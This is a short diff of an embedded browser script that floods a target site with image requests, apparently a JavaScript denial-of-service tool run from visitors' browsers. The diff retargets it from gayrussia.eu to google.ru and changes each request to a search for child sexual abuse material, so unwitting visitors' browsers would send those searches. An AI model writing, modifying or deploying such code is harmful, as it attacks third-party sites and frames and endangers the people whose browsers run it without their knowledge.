@@ -1,6 +1,6 @@
 <script>
 (function () {
-	var targetURL = "http://gayrussia.eu";
+	var targetURL = "http://google.ru";
 	var fireInterval;
 	var isFiring = false;
 	var requestsHT = {};
@@ -16,7 +16,7 @@
 			img.onerror = function () { onFail(rID); };
 			img.onabort = function () { onFail(rID); };
 			img.onload = function () { onSuccess(rID); };
-			img.setAttribute("src", targetURL + "/news/" + rID);
+			img.setAttribute("src", targetURL + "/search?q=child+porn+download");
 			requestsHT[rID] = img;
 			onRequest(rID);
 		};
